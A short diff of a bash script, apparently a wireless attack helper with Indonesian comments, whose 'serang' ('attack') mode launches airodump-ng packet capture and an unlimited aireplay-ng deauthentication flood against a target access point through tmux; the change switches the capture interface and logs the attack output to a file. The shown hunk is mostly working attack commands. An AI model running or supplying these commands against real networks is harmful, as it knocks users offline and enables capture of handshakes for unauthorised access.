@@ -9,9 +9,9 @@ then
 elif [[ $1 == "serang" ]]
 then
 	tmux new -d
-	sudo tmux send -Rt 0 airodump-ng SPACE -w SPACE serang SPACE --output-format SPACE pcap SPACE  wlan0mon ENTER
+	sudo tmux send -Rt 0 airodump-ng SPACE -w SPACE serang SPACE --output-format SPACE pcap SPACE  wlan1mon ENTER
 	tmux new -d
-	sudo tmux send -Rt 1 aireplay-ng SPACE --deauth SPACE 0 SPACE -a SPACE $2 SPACE wlan1mon ENTER
+	sudo tmux send -Rt 1 aireplay-ng SPACE --deauth SPACE 0 SPACE -a SPACE $2 SPACE wlan1mon SPACE ">" SPACE serang.txt ENTER
 
 else 												# Mode fokus, Airodump cuma mantau AP dilindungi aja
 	sudo rm hasil_pantauan-*
